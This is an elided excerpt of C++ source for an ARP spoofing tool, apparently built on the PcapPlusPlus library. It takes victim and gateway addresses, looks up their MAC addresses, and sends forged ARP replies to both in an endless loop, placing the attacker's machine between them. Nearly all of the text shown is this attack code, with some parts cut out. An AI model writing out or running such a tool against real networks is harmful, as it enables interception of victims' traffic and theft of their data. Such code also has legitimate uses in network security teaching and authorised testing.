...
void printUsage() {
    std::cout << std::endl
              ...
              << "------" << std::endl
              << pcpp::AppName::get()
              << " [-hv] -i interface_ip -c victim_ip -g gateway_ip" << std::endl
              << std::endl
              << "Options:" << std::endl
              << std::endl
...
pcpp::MacAddress getMacAddress(const pcpp::IPv4Address& ipAddr,
    ...
    pcpp::ArpLayer arpLayer(pcpp::ARP_REQUEST, pDevice->getMacAddress(),
                            pDevice->getMacAddress(), pDevice->getIPv4Address(),
                            ipAddr);
...
void doArpSpoofing(pcpp::PcapLiveDevice* pDevice,
    ...
    pcpp::EthLayer gwEthLayer(deviceMacAddress, gatewayMacAddr,
                              (uint16_t)PCPP_ETHERTYPE_ARP);
    pcpp::ArpLayer gwArpLayer(pcpp::ARP_REPLY, pDevice->getMacAddress(),
                              gatewayMacAddr, victimAddr, gatewayAddr);
    ...
    pcpp::EthLayer victimEthLayer(deviceMacAddress, victimMacAddr,
                                  (uint16_t)PCPP_ETHERTYPE_ARP);
    pcpp::ArpLayer victimArpLayer(pcpp::ARP_REPLY, pDevice->getMacAddress(),
                                  victimMacAddr, gatewayAddr, victimAddr);
    ...
    while (1) {
        ...
        std::cout << "Sent ARP reply: " << victimAddr
                  << " [victim] is at MAC address " << deviceMacAddress << " [me]"
                  << std::endl;
